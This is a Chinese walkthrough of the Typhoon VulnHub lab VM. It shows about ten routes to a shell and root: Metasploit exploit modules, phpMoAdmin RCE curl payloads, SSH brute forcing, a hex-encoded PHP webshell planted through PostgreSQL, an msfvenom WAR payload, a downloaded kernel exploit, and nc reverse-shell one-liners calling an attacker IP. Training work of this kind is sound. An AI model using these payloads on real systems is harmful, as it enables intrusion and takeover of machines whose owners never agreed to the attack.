## Typhoon-v1.02 简介

该项目是[PrismaCSI](https://www.vulnhub.com/author/prismacsi,602/)作者精心制作的项目环境，目标是获取获得root权限并找到flag.txt文本信息，该项目作为OSCP考试培训必打的一个项目环境，该作者评定该环境为渗透中级水准难度。接下来不管是零基础学习渗透者，还是有些基础的渗透者，甚至是高水平的渗透人员读该的技巧和文章都能学习到一些红队知识。

Typhoon VM contains several vulnerabilities and configuration errors. Typhoon
can be used to test vulnerabilities in network services, configuration errors,
vulnerable web applications, password cracking attacks, privilege escalation
attacks, post exploitation steps, information gathering and DNS attacks.
Prisma trainings involve practical use of Typhoon.

Typhoon虚拟机包含多个漏洞和配置错误。Typhoon可用于测试网络服务中的漏洞，配置错误，易受攻击的Web应用程序，密码破解攻击，权限提升攻击，利用后步骤，信息收集和DNS攻击。

该项目有始有终会用到信息收集->通过信息收集到的各种思路进行getshell->获得getshell（十种方式）->内网信息枚举->提权，最终拿到flag.txt的过程，那么在这当中用到了一些小技巧都会在文章中演示出来，希望大家能动手也来和我一起学习渗透。

 **请注意：**

> 本文仅用于技术讨论与研究，对于所有笔记中复现的这些终端或者服务器，都是自行搭建的环境进行渗透的。我将使用Kali
> Linux作为此次学习的攻击者机器。这里使用的技术仅用于学习教育目的，如果列出的技术用于其他任何目标，本站及作者概不负责。

![img](https://image.3001.net/images/20220828/1661671578_630b189a6295bb7b711d4.png!small)

## 信息收集

渗透测试的本质就是信息收集，信息收集决定了你的攻击面的宽窄！

下面首先使用nmap进行信息收集

### 1\. nmap扫描网段

由于本项目环境是nat模式需要项目IP地址，对IP网段进行全网段扫描

    
    
    nmap 192.168.27.0/24 -sP

![img](https://image.3001.net/images/20220828/1661671578_630b189ae16ae92c406d0.png!small)

### 2\. nmap全端口扫描

进行namp全端口服务枚举

    
    
    nmap -p- 192.168.27.128 -A

![img](https://image.3001.net/images/20220828/1661671579_630b189b7c428e647cfc4.png!small)

![img](https://image.3001.net/images/20220828/1661671580_630b189c2127826438124.png!small)

![img](https://image.3001.net/images/20220828/1661671580_630b189cc4312efb6f2fe.png!small)

可以看到开放了非常多的端口

nmap输出显示各种开放端口：21(ftp，可以匿名访问的)、22(ssh)、25(smtp)、53(domain)、80(http)、110(pop3)、111(rpcbind)、139(netbios-ssn)、 143(imap)、445(netbios-ssn)、631(ipp)、993(ssl/imaps)、995(ssl/pop3)、2049(nfs_acl)、3306(mysql)、5432(postgrespl)、8080(http)
、6379(redis)、27017(mongodb)

### 3\. web目录枚举

dirb是一个基于字典的web目录扫描工具，查找现有的（和/或隐藏的）Web对象，通过对Web服务器发起基于字典的攻击并分析响应的数据。
采用递归的方式来获取更多的目录，它还支持代理和http认证限制访问的网站，是在信息收集阶段获取目标信息常用工具手段。

这里我们使用dirb对目录进行爆破枚举

![img](https://image.3001.net/images/20220828/1661671581_630b189d701d8925725ec.png!small)

    
    
    dirb http://192.168.27.128/

![img](https://image.3001.net/images/20220828/1661671582_630b189e0338ebc059507.png!small)

[http://192.168.27.128/cms/](http://192.168.253.135/cms/)

[http://192.168.27.128/drupal/](http://192.168.253.135/cms/)

[http://192.168.27.128/phpmyadmin/](http://192.168.253.135/cms/)

[http://192.168.27.128/javascript/](http://192.168.253.135/cms/)

[http://192.168.27.128/robots.txt](http://192.168.253.135/cms/)

通过dirb对目标网站进行扫描发现存在phpmyadmin以及robots.txt和drupal，cms等目录文件

## 攻击思路（一）：drupal漏洞利用

    
    
    msfconsole

使用msf进行漏洞利用

查找drupal模块

    
    
    search drupal

![img](https://image.3001.net/images/20220828/1661671582_630b189e93091a0d6635f.png!small)

有很多漏洞，尝试使用最新的2018年的exp

    
    
    use exploit/unix/webapp/drupal_drupalgeddon2

填写攻击ip地址

    
    
    set rhosts 192.168.27.128

这里注意扫描目录要修改一下

    
    
    set TARGETURI /drupal  
    run

![img](https://image.3001.net/images/20220828/1661671583_630b189f3ac896cf521a3.png!small)

拿到一个反弹shell

![img](https://image.3001.net/images/20220828/1661671583_630b189fced90d3eca403.png!small)

    
    
    /bin/bash -i

获取一个稳定shell

![img](https://image.3001.net/images/20220828/1661671584_630b18a05a9d56897eab5.png!small)

查看版本

    
    
    uname -a

![img](https://image.3001.net/images/20220828/1661671584_630b18a0cf7765fb10bec.png!small)

直接查找3.13.0

    
    
    searchsploit 3.13.0

![img](https://image.3001.net/images/20220828/1661671585_630b18a1595a9b3eb0bcb.png!small)

直接使用脚本

    
    
    searchsploit -m linux/local/37292.c

将exp复制到当前目录，并开启http服务，将exp下载到目标机器

    
    
    python -m SimpleHTTPServer 8080  
    wget http://192.168.27.187:8080/37292.c

编译并命名为ylion，授予ylion权限并运行

    
    
    gcc 37292.c -o ylion  
    chmod +x ylion  
    ./ylion

提权成功

成功拿到root权限！

## 攻击思路（二）：SSH端口爆破

发现端口22开放，其版本为openssh 6.6.1p1

利用OpenSSH新爆出的CVE爆出目标主机的用户，这对特定的用户爆破密码，建议爆破1000条

![img](https://image.3001.net/images/20220828/1661671585_630b18a1d2a23f6a0320f.png!small)

    
    
    searchsploit openssh

![img](https://image.3001.net/images/20220828/1661671586_630b18a2607fa36e07cde.png!small)

OpenSSH 2.3 < 7.7 - Username Enumeration

可以直接使用这个poc脚本进行攻击

只要在search里面能找到的exp或者poc，在msf里面都是有的

    
    
    search ssh/ssh_

![img](https://image.3001.net/images/20220828/1661671587_630b18a31cf493bd30261.png!small)

使用第六个

    
    
    use auxiliary/scanner/ssh/ssh_enumusers  
    options

查看参数

![img](https://image.3001.net/images/20220828/1661671587_630b18a3cb7359f67cbf9.png!small)

    
    
    set thosts 192.168.27.128

修改为攻击ip

将爆破字典放到桌面的目录下

![img](https://image.3001.net/images/20220828/1661671588_630b18a46fa4f322c2dda.png!small)

并且写入参数中，如下

![img](https://image.3001.net/images/20220828/1661671589_630b18a5050c131aa22c8.png!small)

由于是爆破，把线程调为20

    
    
    set threads 20

然后输入run开始运行

![img](https://image.3001.net/images/20220828/1661671589_630b18a5aff1462801f6b.png!small)

爆破完成，找到admin账户

使用九头蛇hydra对靶机的ssh进行爆破

    
    
    hydra -l admin -P /root/Desktop/1/66/rockyou.txt 192.168.27.128 ssh

![img](https://image.3001.net/images/20220828/1661671590_630b18a63adc1a55393ad.png!small)

用户名为：admin 密码为：metallica

    
    
    ssh admin@192.168.27.128  
    metallica

![img](https://image.3001.net/images/20220828/1661671590_630b18a6d46624c09b68a.png!small)

![img](https://image.3001.net/images/20220828/1661671591_630b18a784d201c7774e3.png!small)

ssh远程登录成功

![img](https://image.3001.net/images/20220828/1661671592_630b18a8295a369ae7ca4.png!small)

查看`sudo -l`情况

可以直接提权

    
    
    sudo bash

提权成功

## 攻击路径（三）：phpMoAdmin

phpMoAdmin 是一个用PHP 开发的在线MongoDB
管理工具，可用于创建、删除和修改数据库和索引，提供视图和数据搜索工具，提供数据库启动时间和内存的统计，支持JSON 格式数据的导入导出。

从之前nmap扫描的数据可以看到如下

![img](https://image.3001.net/images/20220828/1661671592_630b18a8a1eb00fd308e4.png!small)

访问：<http://192.168.27.128/robots.txt>

![img](https://image.3001.net/images/20220828/1661671593_630b18a92d9ea5bb16698.png!small)

访问/robots.txt，是一个mogondb的WebUI管理

访问<http://192.168.27.128/mongoadmin/>

访问可能会有点慢

![img](https://image.3001.net/images/20220828/1661671593_630b18a9a46a5749e1dee.png!small)

这是mongodb数据库的一个php写的管理工具phpmoadmin

后台存在信息泄露，对应可以去查找是否存在漏洞

点击change database

![img](https://image.3001.net/images/20220828/1661671594_630b18aa29fb925eaa453.png!small)

<http://192.168.27.128/mongoadmin/index.php?action=getStats>

![img](https://image.3001.net/images/20220828/1661671594_630b18aab933eeed9de68.png!small)

可以看到版本号是1.0.9，google查一下

phpMoAdmin 1.0.9 exploit

### 两个RCE

    
    
    curl http://192.168.27.128/mongoadmin/index.php -d "object=1;system('whoami');//"
    
    
    curl 'http://192.168.27.128/mongoadmin/index.php?collection=admin&action=listRows&find=array();passthru("uname%20-a");exit;' 

![img](https://image.3001.net/images/20220828/1661671595_630b18ab5e6850d737279.png!small)

### 信息泄露

比较卡，或者在界面多点击几次后等待会出现creds选项：

[http://192.168.27.128/mongoadmin/index.php?db=credentials&action=listRows&collection=creds](http://192.168.27.128/mongoadmin/index.php?db=credentials&action=listRows&collection=creds)

![img](https://image.3001.net/images/20220828/1661671595_630b18abe11cf3a0f4cd3.png!small)

发现：

[username] => typhoon

[password] => 789456123

    
    
    ssh typhoon@192.168.253.135  
    789456123

即可ssh远程登录

## 攻击路径（四）：LotusCMS漏洞利用

LotusCMS将最前沿的设计和设计集成到了最被忽视的CMS生态位之一-无数据库Web设计和开发中。

在之前爆破到的目录存在一个cms

[http://192.168.27.128/cms/](http://192.168.253.135/cms/)

![img](https://image.3001.net/images/20220828/1661671596_630b18ac7f33dd5ace02a.png!small)

lcms是一个不需要数据库就可以支撑的框架

这里我们通过msf进行攻击

    
    
    msfconsole  
    search lcms

![img](https://image.3001.net/images/20220828/1661671597_630b18ad05dc7727f661e.png!small)

找到一个低版本的exp

    
    
    use exploit/multi/http/lcms_php_exec  
    set rhosts 192.168.27.128  
    set rport 80  
    set uri /cms/

使用该exp进行尝试，并且添加参数进去

![img](https://image.3001.net/images/20220828/1661671597_630b18ad93d3bac2cc117.png!small)

    
    
    run

成功拿到反弹shell

![img](https://image.3001.net/images/20220828/1661671598_630b18ae1d630f8ca8bb9.png!small)

## 攻击路径（五）：Tomcat漏洞利用

Tomcat是一个应用服务器。他可以运行你按照J2EE中的Servlet规范编写好的Java程序。

简单的说它是一个Web网站的运行容器，把你写好的网站放进去就可以运行。

![img](https://image.3001.net/images/20220828/1661671598_630b18aea755872a477b7.png!small)

访问8080端口，是一个tomcat7的站点，直接点击manager

![img](https://image.3001.net/images/20220828/1661671599_630b18af2f70d492f8de1.png!small)

出现登录框，尝试使用默认账户登录 tomcat/tomcat

![img](https://image.3001.net/images/20220828/1661671599_630b18afdf9e584f7bd5a.png!small)

![img](https://image.3001.net/images/20220828/1661671600_630b18b09e92b844e0d4a.png!small)

登录成功

### exp

使用msf进行攻击，首先查找tomcat相关

    
    
    search tomcat

![img](https://image.3001.net/images/20220828/1661671601_630b18b145284d8f9ad42.png!small)

这里可以使用这个上传的exp，并填写参数

    
    
    use exploit/multi/http/tomcat_mgr_upload  
    set HttpUsername tomcat  
    set HttpPassword tomcat  
    set rhosts 192.168.27.128  
    set rport 8080

![img](https://image.3001.net/images/20220828/1661671601_630b18b1e026e6ca36e1f.png!small)

    
    
    run

![img](https://image.3001.net/images/20220828/1661671602_630b18b27e1e9a67cbd55.png!small)

成功拿到反弹shell

### 后台部署

首先生成一个war包木马

    
    
    msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.27.187 LPORT=4455 -f war -o    ylion.war

![img](https://image.3001.net/images/20220828/1661671603_630b18b321e04d1955e93.png!small)

在刚才登录成功的界面下滑

![img](https://image.3001.net/images/20220828/1661671603_630b18b3b8a3dbbc18310.png!small)

选择war包木马并Deploy

使用命令查看war包内部的恶意代码文件

    
    
    7z l ylion.war

![img](https://image.3001.net/images/20220828/1661671604_630b18b4414b9e854612a.png!small)

开启nc监听4455端口

    
    
    nc -vlp 4455

访问 <http://192.168.27.128:8080/ylion/tiehvcfkfc.jsp>

![img](https://image.3001.net/images/20220828/1661671604_630b18b4c6966ecbeef8b.png!small)

拿到反弹shell

## 攻击路径（六）：Shellshock漏洞利用

Shellshock，又称Bashdoor，是在Unix中广泛使用的Bash shell中的一个安全漏洞，首次于2014年9月24日公开。

![1661670739_630b15532065cd3efe613.png!small?1661670739246](https://image.3001.net/images/20220828/1661670739_630b15532065cd3efe613.png!small?1661670739246)

以上截取自百度的文章中

Nikto 是一款开放源代码的、功能强大的 WEB 扫描评估软件，能对 web
服务器多种安全项目进行测试的扫描软件，去寻找已知有名的漏洞，能在230多种服务器上扫描出2600多种有潜在危险的文件、CGI
及其他问题，它可以扫描指定主机的 WEB 类型、主机名、特定目录、COOKIE、特定 CGI 漏洞、返回主机允许的 http 模式等等。

它也使用 LibWhiske 库，但通常比 Whisker 更新的更为频繁。Nikto 是网管安全人员必备的 WEB 审计工具之一。

Nikto 是 perl 语言开发的，其特点扫描全面，速度快。

这里我们使用nikto对站点进行扫描

    
    
    nikto -h http://192.168.27.128

![img](https://image.3001.net/images/20220828/1661671605_630b18b569003ecb59c94.png!small)

Shellshock - CVE-2014-6271和CVE-2014-6278 - 是在 Linux 发行版中常用的Bash命令shell
中发现的一个严重漏洞。该漏洞允许攻击者在受影响的系统上运行任意命令，使用CGI环境的Web服务器会受影响。

CVE-2014-6271：<https://www.cvedetails.com/cve/cve-2014-6271>

cve-2014-6278：<https://www.cvedetails.com/cve/cve-2014-6278>

CGI环境变量：<http://www.cgi101.com/book/ch3/text.html>

    
    
    msfconsole

使用msf进行漏洞利用，查找shellshock并填写参数

    
    
    search shellshock

![img](https://image.3001.net/images/20220828/1661671606_630b18b60c88eebf67891.png!small)

使用这个exp

    
    
    use exploit/multi/http/apache_mod_cgi_bash_env_exec  
    set payload linux/x86/shell/reverse_tcp  
    set lhost 192.168.27.187  
    set rhosts 192.168.27.128  
    set targeturi /cgi-bin/test.sh  
    run

![img](https://image.3001.net/images/20220828/1661671606_630b18b6b6fa710565b6f.png!small)

成功拿到反弹shell

## 攻击路径（七）：NFS漏洞利用

NFS（Network File
System）即网络文件系统，是FreeBSD支持的文件系统中的一种，它允许网络中的计算机之间共享资源。在NFS的应用中，本地NFS的客户端应用可以透明地读写位于远端NFS服务器上的文件，就像访问本地文件一样。

![img](https://image.3001.net/images/20220828/1661671607_630b18b763c8f47c76d7c.png!small)

  1. 需要知道对方挂载的目录是什么

  2. 进入挂载目录就可以共享信息

使用msf

    
    
    search nfs

![img](https://image.3001.net/images/20220828/1661671608_630b18b81f553107d0b57.png!small)

    
    
    set rhosts 192.168.27.128

![img](https://image.3001.net/images/20220828/1661671608_630b18b8b9fe92eba47ca.png!small)

/typhoon [*] ---挂载了该目录

    
    
    mkdir /tmp/typhoon

创建一个/tmp/typhoon目录

    
    
    mount -t nfs 192.168.27.128:/typhoon /tmp/typhoon

将目标挂载的目录挂载到我们新建的目录下

查看目录下内容

![img](https://image.3001.net/images/20220828/1661671609_630b18b9541903ea5183b.png!small)

## 攻击路径（八）：5432 PostgreSQL漏洞利用

![img](https://image.3001.net/images/20220828/1661671609_630b18b9e6659a5bc59ee.png!small)

PostgreSQL是一个功能非常强大的、源代码开放的客户/服务器关系型数据库管理系统（RDBMS）

用msf尝试爆破PostgreSQL数据库用户名密码

    
    
    search postgres

![img](https://image.3001.net/images/20220828/1661671610_630b18ba7b7e1303d1053.png!small)

    
    
    use auxiliary/scanner/postgres/postgres_login  
    set rhosts  192.168.27.128  
    run

![img](https://image.3001.net/images/20220828/1661671611_630b18bb2d3edf987ff51.png!small)

postgres:postgres@template1

    
    
    psql -h 192.168.27.128 -U postgres  
    postgres@template1

![img](https://image.3001.net/images/20220828/1661671612_630b18bc6730f03866ec3.png!small)

一开始登录失败，尝试密码为postgres成功

  1. 列出目录

    
    
    select pg_ls_dir('./');

![img](https://image.3001.net/images/20220828/1661671613_630b18bd1130dab549c3c.png!small)

  1. 读取权限允许的文件

    
    
    select pg_read_file('postgresql.conf',0,1000);

  1. 读取/etc/passwd第一行

    
    
    DROP TABLE if EXISTS MrLee;CREATE TABLE MrLee(t TEXT);COPY MrLee FROM '/etc/passwd';select * from MrLee limit 1 offset 0;

  1. 直接读出所有数据

    
    
    SELECT * FROM MrLee;

按下Q退出当前页面！

  1. 利用数据库写文件

    
    
    INSERT INTO MrLee(t) VALUES('hello,MrLee');  
    COPY MrLee(t) TO '/tmp/MrLee';

  

    
    
    SELECT * FROM MrLee;

读取发现：

hello,MrLee

(46 行记录)

显示里面有一句hello,MrLee，成功写入文件，并成功读取到源内容

  1. 创建OID，清空内容

    
    
    SELECT lo_create(998);  
    delete from pg_largeobject where loid=998;

![img](https://image.3001.net/images/20220828/1661671613_630b18bd83bdc7798990c.png!small)

  1. 接下来就是写入木马使用hex---小葵

<?php @eval($_POST['123']);?>

0x3C3F70687020406576616C28245F504F53545B27313233275D293B3F3E

![img](https://image.3001.net/images/20220828/1661671614_630b18be011616be99b5b.png!small)

    
    
    insert into pg_largeobject (loid,pageno,data) values(998, 0, decode('3C3F70687020406576616C28245F504F53545B27313233275D293B3F3E', 'hex'));

![img](https://image.3001.net/images/20220828/1661671614_630b18be91dc6792b5249.png!small)

    
    
    select lo_export(998,'/var/www/html/shell.php');

将id998的内容写到/var/www/html/shell.php内

![img](https://image.3001.net/images/20220828/1661671615_630b18bf0f7718a1ecbd3.png!small)

<http://192.168.27.128/shell.php>

![img](https://image.3001.net/images/20220828/1661671615_630b18bf75d01bc666c1c.png!small)

访问为空白页面

使用蚁剑连接

![img](https://image.3001.net/images/20220828/1661671615_630b18bfeafed723e7898.png!small)

攻击路径（九）：Samba远程代码执行漏洞（CVE-2017-7494）Linux版永恒之蓝 445端口（139端口）

![img](https://image.3001.net/images/20220828/1661671616_630b18c089d1e5307dd3a.png!small)

Samba 是在 Linux 和 UNIX 系统上实现 SMB 协议的一个软件，不少 IoT 设备也使用了 Samba。2017年5月24日 Samba
发布了 4.6.4 版本，修复了一个严重的远程代码执行漏洞，漏洞编号 CVE-2017-7494，攻击者可以利用该漏洞在目标服务器上执行任意代码。

漏洞利用条件：

  1. 服务端共享目录有访问权限。

  2. 需要对服务器上写一个恶意文件并知道该文件的物理路径。 影响版本： Samba 3.5+ <4.6.4 <4.5.10 <4.4.14

注：可使用‘smbd -V’命令查看 Samba 的版本信息。

可以叫做linux版永恒之蓝，445端口和139端口 CVE-2017-7494

win的为 ms17_010

  

使用msf，查找漏洞

    
    
    search CVE-2017-7494

![img](https://image.3001.net/images/20220828/1661671617_630b18c10fd962f4c8fff.png!small)

    
    
    use exploit/linux/samba/is_known_pipename  
    set rhosts 192.168.27.128

![img](https://image.3001.net/images/20220828/1661671617_630b18c1c756a8dbad341.png!small)

    
    
    run

![img](https://image.3001.net/images/20220828/1661671618_630b18c272dc745da517f.png!small)

成功拿到shell

## 攻击路径（十）：25端口DNS漏洞利用-区域攻击

![img](https://image.3001.net/images/20220828/1661671619_630b18c32c979b4d4359f.png!small)

### 25smtp端口获取DNS域

53端口说明肯定有域，提供域名DNS解析使用的

通过25端口去探测当前DNS

    
    
    telnet 192.168.27.128 25

![img](https://image.3001.net/images/20220828/1661671619_630b18c3cf3e690586448.png!small)

可以执行命令

注：kali的hosts文件中一般有ip和域名的，但是如果是空值的话kali自带域名

可以让对方服务器来找我们当前的域名，发送信息

`EHLO kali.local`\-----客户端为标识自己的身份而发送的命令（通常带域名）

![img](https://image.3001.net/images/20220828/1661671620_630b18c479df7712660d9.png!small)

第一行的typhoon是返回的服务器信息，下面的是可执行的操作

VRFY是用来探测DNS的，可以确认邮件在传输当中的一个域名信息

尝试探测typhoon.local

    
    
    VRFY typhoon.local

![img](https://image.3001.net/images/20220828/1661671621_630b18c54187d2d46c559.png!small)

报错，没有这个信息，尝试加入root@（一般情况下都可以去这样尝试）

    
    
    VRFY root@typhoon.local

![img](https://image.3001.net/images/20220828/1661671621_630b18c5c12a0be7a3e98.png!small)

确认在邮件传递过程中可以使用邮箱，并且存在这样一个域名信息

DNS 服务器可能正在服务 typhoon.local，让我们尝试执行区域传输

### dig对域全记录解析

探测DNS使用dig

dig （域信息搜索器）命令是一个用于询问DNS 域名服务器的灵活的工具。 它执行DNS 搜索，显示从受请求的域名服务器返回的答复。 多数DNS
管理员利用dig 作为DNS 问题的故障诊断，因为它灵活性好、易用、输出清晰。 虽然通常情况下dig
使用命令行参数，但它也可以按批处理模式从文件读取搜索请求。

涉及dig一个重要的命令axfr，axfr是q-type类型的一种，axfr类型是Authoritative
Transfer的缩写，指请求传送某个区域的全部记录。

只要欺骗dns服务器发送一个axfr请求过去，如果该dns服务器上存在该漏洞，就会返回所有的解析记录值。

    
    
    dig axfr @192.168.27.128 typhoon.local

![img](https://image.3001.net/images/20220828/1661671622_630b18c642d0b9aa48c1b.png!small)

axfr会将所有访问域名`typhoon.local`建立传输和响应的记录都显示出来

可以看到有很多子域名

这个时候就可以将ip和子域名加入到hosts文件中，然后一个一个进行查看

这里子域名`calendar.typhoon.local`存在问题

    
    
    gedit /etc/hosts  
    192.168.27.128 calendar.typhoon.local

![img](https://image.3001.net/images/20220828/1661671622_630b18c6f4181e9402fdf.png!small)

然后可以通过浏览器去访问这个子域名

    
    
    calendar.typhoon.local

![img](https://image.3001.net/images/20220828/1661671623_630b18c76a42aeb8ee20a.png!small)

发现版本：

WebCalendar v1.2.4 (08 Aug 2011)

### 子域发现WebCalendar并利用

WebCalendar是一个基于Web的日历应用软件。可配置成单个用户日历，多用户日历或访问者可以浏览的事件日历。WebCalendar需要数据库支持可以是MySQL，Oracle，PostgreSQL，
MSSQLServer，ODBC，
Interbase。它的特性：当更新/新增/删除事件或事件即将发生时通过Email提醒，iCal/vCal导入/导出。支持LDAP与NIS用户身
份验证。支持把用户的日历事件添加到RSS中。支持简体中文等。

在kali上查找webcalendar漏洞相关

    
    
    searchsploit webcalendar

![img](https://image.3001.net/images/20220828/1661671624_630b18c8076d03e70ede2.png!small)

发现exploits/linux/webapps/18797.rb可以利用

这里使用msf进行漏洞利用

    
    
    msfconsole  
    search webcalendar

![img](https://image.3001.net/images/20220828/1661671624_630b18c8980ef90a0e239.png!small)

选择exp

    
    
    use exploit/linux/http/webcalendar_settings_exec

填写域名

    
    
    set rhosts calendar.typhoon.local  
    set vhost calendar.typhoon.local

修改目录

    
    
    set targeturi /  
    set lhost 192.168.27.187

![img](https://image.3001.net/images/20220828/1661671625_630b18c93ab35223d26c0.png!small)

    
    
    run

![img](https://image.3001.net/images/20220828/1661671626_630b18ca45d3b42def65f.png!small)

成功获得反弹shell

## 内部信息收集

### 37292.c提权

    
    
    uname -a

![img](https://image.3001.net/images/20220828/1661671584_630b18a0cf7765fb10bec.png!small)

直接查找3.13.0

    
    
    searchsploit 3.13.0

![img](https://image.3001.net/images/20220828/1661671585_630b18a1595a9b3eb0bcb.png!small)

直接使用脚本

    
    
    searchsploit -m linux/local/37292.c

将exp复制到当前目录，并开启http服务，将exp下载到目标机器

    
    
    python -m SimpleHTTPServer 8080  
    wget http://192.168.27.187:8080/37292.c

编译并命名为ylion，授予ylion权限并运行

    
    
    gcc 37292.c -o ylion  
    chmod +x ylion  
    ./ylion

提权成功

成功拿到root权限

### 写文件提权

使用枚举脚本会发现

在/tab/目录下有一个文件所有者为root、权限为777的sh文件。

    
    
    echo "mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.27.187 8888 >/tmp/f" > script.sh  
    nc -vlp 8888  
    ./script.sh
    
    
    rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.27.187 8888 >/tmp/f

## 总结

通过以上的学习，我们认知了一些红队的小技巧的技术手段，完成了从信息收集到内核提权项目落地，学习到了非常多的技巧，例如nmap全端口信息枚举、drupal漏洞利用、SSH端口爆破、phpMoAdmin利用、LotusCMS漏洞利用、Tomca漏洞利用、Shellshock漏洞利用、NSF漏洞利用、5432
PostgreSQL漏洞利用、Samba远程代码执行漏洞（CVE-2017-7494）Linux版永恒之蓝
445端口（139端口）、25端口DNS漏洞利用-区域攻击等等，希望伙伴们能实际操作复现一遍，不要眼高手低！巩固自身的渗透技术和技巧！

最后

希望大家提高安全意识，没有网络安全就没有国家安全！

